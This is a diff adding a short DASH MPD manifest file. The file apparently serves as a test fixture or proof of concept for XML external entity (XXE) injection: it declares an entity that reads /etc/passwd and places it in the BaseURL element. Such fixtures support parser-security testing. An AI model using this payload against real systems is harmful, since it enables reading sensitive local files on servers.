@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE MPD [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<MPD>
+  <Period>
+    <AdaptationSet>
+      <Representation id="1">
+        <BaseURL>&xxe;</BaseURL>
+      </Representation>
+    </AdaptationSet>
+  </Period>
+</MPD>
